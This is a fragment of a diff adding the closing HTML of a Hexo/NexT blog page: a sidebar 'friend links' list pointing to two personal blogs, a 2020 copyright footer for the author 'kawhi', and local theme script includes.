+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.tattooo.top/" title="https:&#x2F;&#x2F;www.tattooo.top" rel="noopener" target="_blank">Tattoo's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.plasf.cn/" title="https:&#x2F;&#x2F;www.plasf.cn&#x2F;" rel="noopener" target="_blank">Xiao Leung's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
